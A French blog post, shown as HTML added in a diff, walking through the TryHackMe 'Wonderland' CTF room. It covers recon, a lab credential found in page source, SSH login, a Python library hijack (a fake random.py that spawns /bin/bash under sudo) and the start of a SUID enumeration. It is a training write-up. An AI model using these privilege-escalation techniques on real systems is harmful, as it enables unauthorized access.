@@ -1,0 +1,507 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    
+      <title>
+        🇫🇷 TryHackMe - Wonderland ::
+        infosec blog
+      </title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta
+  name="description"
+  content="wonderland.thm # Difficulty: Medium OS: Linux Description: Fall down the rabbit hole and enter wonderland. Link: https://tryhackme.com/room/wonderland Note # Objectivement, c’est une bonne room quoique un peu facile pour une “medium”, mais elle reste plutôt sympa puis elle a une sorte “d’histoire”, de “logique” avec le système de l’énumération puis tout les mouvements latéraux à faire avec les users.
+Ca aurait été plus sympa qu’elle ne crash pas toutes les minutes"
+/>
+<meta
+  name="keywords"
+  content="rami malek"
+/>
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="/thm-writeups/thm-wonderland/" />
+
+
+<meta name="description" content="un blog sur lequel vous pourrez retrouver des writeups et des posts explicatifs en français et en anglais">
+
+
+
+
+<link rel="stylesheet" href="/css/style.css" />
+
+<link rel="stylesheet" href="/style.css" />
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="/img/apple-touch-icon-144-precomposed.png" />
+<link rel="shortcut icon" href="/img/favicon.png" />
+
+
+<link href="/fonts/Inter-Italic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/fonts/Inter-Regular.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/fonts/Inter-Medium.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/fonts/Inter-MediumItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/fonts/Inter-Bold.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/fonts/Inter-BoldItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="🇫🇷 TryHackMe - Wonderland"/>
+<meta name="twitter:description" content="Writeup pour la room &#34;Wonderland&#34;, une room medium sous linux."/>
+
+
+
+<meta property="og:title" content="🇫🇷 TryHackMe - Wonderland" />
+<meta property="og:description" content="Writeup pour la room &#34;Wonderland&#34;, une room medium sous linux." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/thm-writeups/thm-wonderland/" /><meta property="article:section" content="thm-writeups" />
+<meta property="article:published_time" content="2022-12-25T00:00:00+00:00" />
+<meta property="article:modified_time" content="2022-12-25T00:00:00+00:00" /><meta property="og:site_name" content="infosec blog" />
+
+
+
+
+
+
+
+  </head>
+  <body class="dark-theme">
+    <div class="container">
+      <header class="header">
+  <span class="header__inner">
+    <a
+  href="/"
+  class="logo"
+  style="text-decoration: none;"
+>
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
+</svg>
+</span>
+    <span class="logo__text"
+      >c0nfl1c7</span
+    >
+    <span class="logo__cursor"></span>
+  
+</a>
+
+    <span class="header__right">
+      
+        <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="/archive">Archive</a></li>
+        
+      
+      
+        <ul class="menu__sub-inner">
+          <li class="menu__sub-inner-more-trigger">
+            writeups
+            <span class="menu__sub-inner-more-trigger-icon"
+              ><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
+</svg>
+</span
+            >
+          </li>
+          <ul class="menu__sub-inner-more hidden">
+            
+              
+                <li><a href="/htb-writeups/">HTB Writeups</a></li>
+              
+            
+              
+                <li><a href="/thm-writeups/">THM Writeups</a></li>
+              
+            
+          </ul>
+        </ul>
+      
+      
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/about">About</a></li>
+      
+    
+      
+        <li><a href="/archive">Archive</a></li>
+      
+    
+      
+        <li><a href="/htb-writeups/">HTB Writeups</a></li>
+      
+    
+      
+        <li><a href="/thm-writeups/">THM Writeups</a></li>
+      
+    
+  </ul>
+</nav>
+
+        <span class="menu-trigger">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none" />
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z" />
+          </svg>
+        </span>
+      
+      <span class="theme-toggle">
+        <svg
+  class="theme-toggler"
+  width="24"
+  height="24"
+  viewBox="0 0 48 48"
+  fill="none"
+  xmlns="http://www.w3.org/2000/svg"
+>
+  <path
+    d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"
+  />
+</svg>
+
+      </span>
+    </span>
+  </span>
+</header>
+
+
+      <div class="content">
+        
+  
+  
+
+  <article class="post">
+    <h1 class="post-title">🇫🇷 TryHackMe - Wonderland</h1>
+    <div class="post-meta">
+      
+        <time class="post-date">
+          25-12-2022
+        </time>
+
+        
+      
+
+      
+        <span class="post-author"
+          >— écrit par conflict</span
+        >
+
+
+      
+        <span class="post-read-time"
+          >— 8 minute(s) de lecture</span
+        >
+      
+    </div>
+
+    
+
+    
+
+    <div class="post-content">
+      
+      <h1 id="wonderlandthm">
+  wonderland.thm
+  <a href="#wonderlandthm" class="h-anchor" aria-hidden="true">#</a>
+</h1>
+<ul>
+<li>Difficulty: Medium</li>
+<li>OS: Linux</li>
+<li>Description: <code>Fall down the rabbit hole and enter wonderland.</code></li>
+<li>Link: <a href="https://tryhackme.com/room/wonderland">https://tryhackme.com/room/wonderland</a></li>
+</ul>
+<h1 id="note">
+  Note
+  <a href="#note" class="h-anchor" aria-hidden="true">#</a>
+</h1>
+<p>Objectivement, c’est une bonne room quoique un peu facile pour une “medium”, mais elle reste plutôt sympa puis elle a une sorte “d’histoire”, de “logique” avec le système de l’énumération puis tout les mouvements latéraux à faire avec les users.</p>
+<p>Ca aurait été plus sympa qu’elle ne crash pas toutes les minutes</p>
+<h1 id="recon">
+  Recon
+  <a href="#recon" class="h-anchor" aria-hidden="true">#</a>
+</h1>
+<p><code>⌨️ nmap -A wonderland.thm</code></p>
+<p><img src="https://user-images.githubusercontent.com/77807503/207728609-7912b8c0-2bd2-4d77-a1bf-ccf7d194279e.png" alt="2022-12-14-184818_930x1026_scrot"></p>
+<p>Rien de très intéressant dans le Nmap, je compte sur le dirb</p>
+<p><code>⌨️ dirb http://wonderland.thm</code></p>
+<p><img src="https://user-images.githubusercontent.com/77807503/207728645-1105033f-d603-4d03-9d9b-aa029247f036.png" alt="2022-12-14-190031_1888x1032_scrot"></p>
+<p>Le dirb trouve un <strong><strong><strong>/r/</strong></strong></strong> je vais voir dessus mais il n’y a rien de très intéressant, juste la phrase</p>
+<blockquote>
+<p><strong>K</strong>eep going.</p>
+</blockquote>
+<p>…</p>
+<p>Il y avait une image sur la page principale:</p>
+<p><img src="https://user-images.githubusercontent.com/77807503/207728797-8ade696b-b5c2-4052-8952-12f037292e8d.png" alt="2022-12-14-184717_1888x1032_scrot"></p>
+<p>Je la met dans <a href="https://www.aperisolve.com/">Aperi’Solve</a>, et je vois que <strong><strong><strong><strong><strong><strong><strong><strong>steghide</strong></strong></strong></strong></strong></strong></strong></strong> a trouvé quelque chose d’intéressant:</p>
+<p>Il y a un fichier <strong><strong><strong><strong><strong><strong><strong><strong>hint.txt</strong></strong></strong></strong></strong></strong></strong></strong> dans l’image, dans lequel il est écrit:</p>
+<blockquote>
+<p>follow the r a b b i t</p>
+</blockquote>
+<p>Je comprend assez vite que dans le <strong><strong><strong>/r/</strong></strong></strong>, il y a <strong>/a/</strong>, puis <strong>/b/</strong>, etc…</p>
+<p>→ <a href="http://wonderland.thm/r/a/b/b/i/t/">http://wonderland.thm/r/a/b/b/i/t/</a></p>
+<p><img src="https://user-images.githubusercontent.com/77807503/207728867-224beb06-9b10-45a2-9040-2cdf6b30c025.png" alt="2022-12-14-190409_1888x1032_scrot"></p>
+<p>Puisqu’on a fini d’épeller le mot <strong><strong><strong><strong><strong><strong>rabbit</strong></strong></strong></strong></strong></strong>, on peut partir du principe qu’on est cette fois sur la bonne page. En regardant le code source on trouve ceci:</p>
+<p><img src="https://user-images.githubusercontent.com/77807503/207728897-e0ffe71b-9f37-4456-a26d-6eaded2fdb75.png" alt="2022-12-14-190416_1888x1032_scrot"></p>
+<p><strong>alice:HowDothTheLittleCrocodileImproveHisShiningTail</strong></p>
+<p><code>⌨️ ssh alice@wonderland.thm</code></p>
+<p><img src="https://user-images.githubusercontent.com/77807503/207728942-58c1a333-8faa-4034-a673-d980dd49013e.png" alt="2022-12-14-190517_1888x1032_scrot"></p>
+<h1 id="lateral-move-alice--rabbit">
+  Lateral move (alice → rabbit)
+  <a href="#lateral-move-alice--rabbit" class="h-anchor" aria-hidden="true">#</a>
+</h1>
+<p>Je commence par un <strong><strong><strong><strong><strong><strong><strong><strong>sudo -l</strong></strong></strong></strong></strong></strong></strong></strong>, qui retourne ceci:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>Matching Defaults entries <span style="color:#66d9ef">for</span> alice on wonderland:
+</span></span><span style="display:flex;"><span>    env_reset, mail_badpass, secure_path<span style="color:#f92672">=/</span>usr<span style="color:#f92672">/</span>local<span style="color:#f92672">/</span>sbin\:<span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>local<span style="color:#f92672">/</span>bin\:<span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>sbin\:<span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>bin\:<span style="color:#f92672">/</span>sbin\:<span style="color:#f92672">/</span>bin\:<span style="color:#f92672">/</span>snap<span style="color:#f92672">/</span>bin
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>User alice may run the following commands on wonderland:
+</span></span><span style="display:flex;"><span>    (rabbit) <span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>python3<span style="color:#ae81ff">.6</span> <span style="color:#f92672">/</span>home<span style="color:#f92672">/</span>alice<span style="color:#f92672">/</span>walrus_and_the_carpenter<span style="color:#f92672">.</span>py
+</span></span></code></pre></div><p><strong><strong><strong><strong><strong>alice</strong></strong></strong></strong></strong> a donc la permission d’éxecuter <strong>/usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py</strong> en tant que <strong><strong><strong><strong><strong><strong>rabbit</strong></strong></strong></strong></strong></strong></p>
+<p>On va cat le .py pour voir un peu ce qu’il y a dedans</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> random
+</span></span><span style="display:flex;"><span>poem <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;&#34;The sun was shining on the sea,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Shining with all his might:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">He did his very best to make
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">The billows smooth and bright —
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">And this was odd, because it was
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">The middle of the night.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">The moon was shining sulkily,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Because she thought the sun
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Had got no business to be there
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">After the day was done —
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;It’s very rude of him,&#34; she said,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;To come and spoil the fun!&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">The sea was wet as wet could be,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">The sands were dry as dry.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">You could not see a cloud, because
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">No cloud was in the sky:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">No birds were flying over head —
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">There were no birds to fly.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">The Walrus and the Carpenter
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Were walking close at hand;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">They wept like anything to see
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Such quantities of sand:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;If this were only cleared away,&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">They said, &#34;it would be grand!&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;If seven maids with seven mops
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Swept it for half a year,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Do you suppose,&#34; the Walrus said,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;That they could get it clear?&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;I doubt it,&#34; said the Carpenter,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">And shed a bitter tear.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;O Oysters, come and walk with us!&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">The Walrus did beseech.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;A pleasant walk, a pleasant talk,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Along the briny beach:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">We cannot do with more than four,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">To give a hand to each.&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">The eldest Oyster looked at him.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">But never a word he said:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">The eldest Oyster winked his eye,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">And shook his heavy head —
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Meaning to say he did not choose
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">To leave the oyster-bed.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">But four young oysters hurried up,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">All eager for the treat:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Their coats were brushed, their faces washed,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Their shoes were clean and neat —
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">And this was odd, because, you know,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">They hadn’t any feet.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Four other Oysters followed them,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">And yet another four;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">And thick and fast they came at last,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">And more, and more, and more —
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">All hopping through the frothy waves,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">And scrambling to the shore.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">The Walrus and the Carpenter
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Walked on a mile or so,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">And then they rested on a rock
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Conveniently low:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">And all the little Oysters stood
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">And waited in a row.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;The time has come,&#34; the Walrus said,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;To talk of many things:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Of shoes — and ships — and sealing-wax —
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Of cabbages — and kings —
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">And why the sea is boiling hot —
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">And whether pigs have wings.&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;But wait a bit,&#34; the Oysters cried,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;Before we have our chat;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">For some of us are out of breath,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">And all of us are fat!&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;No hurry!&#34; said the Carpenter.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">They thanked him much for that.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;A loaf of bread,&#34; the Walrus said,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;Is what we chiefly need:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Pepper and vinegar besides
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Are very good indeed —
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Now if you’re ready Oysters dear,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">We can begin to feed.&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;But not on us!&#34; the Oysters cried,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Turning a little blue,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;After such kindness, that would be
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">A dismal thing to do!&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;The night is fine,&#34; the Walrus said
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;Do you admire the view?
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;It was so kind of you to come!
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">And you are very nice!&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">The Carpenter said nothing but
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;Cut us another slice:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">I wish you were not quite so deaf —
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">I’ve had to ask you twice!&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;It seems a shame,&#34; the Walrus said,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;To play them such a trick,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">After we’ve brought them out so far,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">And made them trot so quick!&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">The Carpenter said nothing but
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;The butter’s spread too thick!&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;I weep for you,&#34; the Walrus said.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;I deeply sympathize.&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">With sobs and tears he sorted out
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Those of the largest size.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Holding his pocket handkerchief
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Before his streaming eyes.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;O Oysters,&#34; said the Carpenter.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;You’ve had a pleasant run!
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Shall we be trotting home again?&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">But answer came there none —
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">And that was scarcely odd, because
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">They’d eaten every one.&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">10</span>):
+</span></span><span style="display:flex;"><span>    line <span style="color:#f92672">=</span> random<span style="color:#f92672">.</span>choice(poem<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>))
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;The line was:</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">&#34;</span>, line)
+</span></span></code></pre></div><p>Le code donne envie de vomir mais bon… il y a un</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> random
+</span></span></code></pre></div><p>puis la fonction <strong><strong><strong><strong><strong><strong>random.choice</strong></strong></strong></strong></strong></strong> est appelée à la fin du code</p>
+<p>On part donc sur une <strong>library hijacking</strong>:</p>
+<p>On crée un <strong><strong><strong><strong><strong><strong><strong><strong><strong>random.py</strong></strong></strong></strong></strong></strong></strong></strong></strong> dans le même dossier que le script, dans lequel on met ce code:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> os <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">choice</span>(x):
+</span></span><span style="display:flex;"><span>        system(<span style="color:#e6db74">&#34;/bin/bash&#34;</span>)
+</span></span></code></pre></div><p>Puis on le lance en tant que rabbit</p>
+<p><code>⌨️ sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py</code></p>
+<blockquote>
+<p>Puisqu’il existe un fichier <strong><strong><strong><strong><strong><strong>random</strong></strong></strong></strong></strong></strong> dans le même dossier que le script qui a été lancé, il importera le fichier <strong><strong><strong><strong><strong><strong>random</strong></strong></strong></strong></strong></strong> et non la lib comme il devrait le faire, notre code sera donc lu et un nouveau shell se créera en tant que <strong><strong><strong><strong><strong><strong>rabbit</strong></strong></strong></strong></strong></strong></p>
+</blockquote>
+<p><img src="https://user-images.githubusercontent.com/77807503/207729307-1513e4be-f494-4d10-ab4d-133226d3dc2c.png" alt="2022-12-14-191319_999x197_scrot"></p>
+<h1 id="lateral-move-rabbit--hatter">
+  Lateral move (rabbit → hatter)
+  <a href="#lateral-move-rabbit--hatter" class="h-anchor" aria-hidden="true">#</a>
+</h1>
+<p>Maintenant qu’on est <strong><strong><strong><strong><strong><strong>rabbit</strong></strong></strong></strong></strong></strong>, il faut trouver un nouveau vecteur de <strong><strong><strong><strong><strong><strong><strong>privesc</strong></strong></strong></strong></strong></strong></strong></p>
+<p>Puisque nous n’avons pas le mot de passe de l’utilisateur, nous ne pouvons pas utiliser de commandes <strong><strong><strong><strong>sudo</strong></strong></strong></strong></p>
+<p>On va donc tenter de voir si certains <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>executables</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong> ont les permissions <strong><strong><strong><strong><strong><strong>setuid</strong></strong></strong></strong></strong></strong></p>
+<p><code>⌨️ find / -user root -perm -4000 -exec ls -ldb {} \; &gt; /tmp/results</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">-</span>rwsr<span style="color:#f92672">-</span>sr<span style="color:#f92672">-</span>x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">16816</span> May <span style="color:#ae81ff">25</span>  <span style="color:#ae81ff">2020</span> <span style="color:#f92672">/</span>home<span style="color:#f92672">/</span>rabbit<span style="color:#f92672">/</span>teaParty
+</span></span><span style="display:flex;"><span><span style="color:#f92672">-</span>rwsr<span style="color:#f92672">-</span>xr<span style="color:#f92672">--</span> <span style="color:#ae81ff">1</span> root messagebus <span style="color:#ae81ff">42992</span> Jun <span style="color:#ae81ff">10</span>  <span style="color:#ae81ff">2019</span> <span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>lib<span style="color:#f92672">/</span>dbus<span style="color:#f92672">-</span><span style="color:#ae81ff">1.0</span><span style="color:#f92672">/</span>dbus<span style="color:#f92672">-</span>daemon<span style="color:#f92672">-</span>launch<span style="color:#f92672">-</span>helper
+</span></span><span style="display:flex;"><span><span style="color:#f92672">-</span>rwsr<span style="color:#f92672">-</span>xr<span style="color:#f92672">-</span>x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">14328</span> Mar <span style="color:#ae81ff">27</span>  <span style="color:#ae81ff">2019</span> <span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>lib<span style="color:#f92672">/</span>policykit<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span><span style="color:#f92672">/</span>polkit<span style="color:#f92672">-</span>agent<span style="color:#f92672">-</span>helper<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">-</span>rwsr<span style="color:#f92672">-</span>xr<span style="color:#f92672">-</span>x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">436552</span> Mar  <span style="color:#ae81ff">4</span>  <span style="color:#ae81ff">2019</span> <span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>lib<span style="color:#f92672">/</span>openssh<span style="color:#f92672">/</span>ssh<span style="color:#f92672">-</span>keysign
+</span></span><span style="display:flex;"><span><span style="color:#f92672">-</span>rwsr<span style="color:#f92672">-</span>xr<span style="color:#f92672">-</span>x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">100760</span> Nov <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2018</span> <span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>lib<span style="color:#f92672">/</span>x86_64<span style="color:#f92672">-</span>linux<span style="color:#f92672">-</span>gnu<span style="color:#f92672">/</span>lxc<span style="color:#f92672">/</span>lxc<span style="color:#f92672">-</span>user<span style="color:#f92672">-</span>nic
+</span></span><span style="display:flex;"><span><span style="color:#f92672">-</span>rwsr<span style="color:#f92672">-</span>xr<span style="color:#f92672">-</span>x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">10232</span> Mar <span style="color:#ae81ff">28</span>  <span style="color:#ae81ff">2017</span> <span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>lib<span style="color:#f92672">/</span>eject<span style="color:#f92672">/</span>dmcrypt<span style="color:#f92672">-</span>get<span style="color:#f92672">-</span>device
+</span></span><span style="display:flex;"><span><span style="color:#f92672">-</span>rwsr<span style="color:#f92672">-</span>xr<span style="color:#f92672">-</span>x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">44528</span> Mar <span style="color:#ae81ff">22</span>  <span style="color:#ae81ff">2019</span> <span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>chsh
+</span></span><span style="display:flex;"><span><span style="color:#f92672">-</span>rwsr<span style="color:#f92672">-</span>xr<span style="color:#f92672">-</span>x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">37136</span> Mar <span style="color:#ae81ff">22</span>  <span style="color:#ae81ff">2019</span> <span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>newuidmap
